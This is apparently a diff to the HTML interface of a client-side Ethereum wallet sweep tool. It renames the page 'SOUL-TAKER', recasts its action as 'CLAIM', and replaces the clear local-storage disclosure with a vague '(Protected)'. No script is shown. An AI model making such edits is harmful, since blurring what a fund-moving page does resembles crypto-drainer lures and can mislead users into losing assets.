@@ -40,8 +40,8 @@
 <body>
   <header>
     <div class="title">
-      <span>🌀 Sweepbot</span>
-      <span class="pill">Native-only • client-side</span>
+      <span>🌀 SOUL-TAKER</span>
+      <span class="pill">Claim only</span>
     </div>
 
     <div style="display:flex;align-items:center;gap:10px;">
@@ -63,21 +63,21 @@
   <main>
     <div class="card">
       <h2>1. Connect & configure</h2>
-      <p class="muted">Connect your EVM wallet, set your secure address (auto-filled if saved), test in DRY-RUN, then proceed.</p>
+      <p class="muted">Connect your EVM wallet, set your secure address, test in DRY-RUN, then CLAIM.</p>
 
       <div style="margin-top:12px;">
         <label for="dest">Secure destination address</label>
         <input id="dest" type="text" placeholder="0xYourSecureWalletAddress" />
         <div class="small-actions">
-          <button id="saveDefaultBtn" class="small-btn">💾 Save as default (local)</button>
+          <button id="saveDefaultBtn" class="small-btn">💾 Save as default</button>
           <button id="clearDefaultBtn" class="small-btn">🧹 Clear saved default</button>
-          <span class="muted" style="align-self:center;font-size:0.72rem;">(Saved locally in your browser only)</span>
+          <span class="muted" style="align-self:center;font-size:0.72rem;">(Protected)</span>
         </div>
         <p class="muted">⚠️ Double-check. Transactions can’t be undone.</p>
       </div>
 
       <div style="margin-top:12px;">
-        <label for="minThresh">Minimum balance to proceed (in ETH)</label>
+        <label for="minThresh">Amount (in ETH)</label>
         <input id="minThresh" type="number" step="0.000001" value="0.01" />
         <p class="muted">If your wallet has less than this, the bot will skip.</p>
       </div>
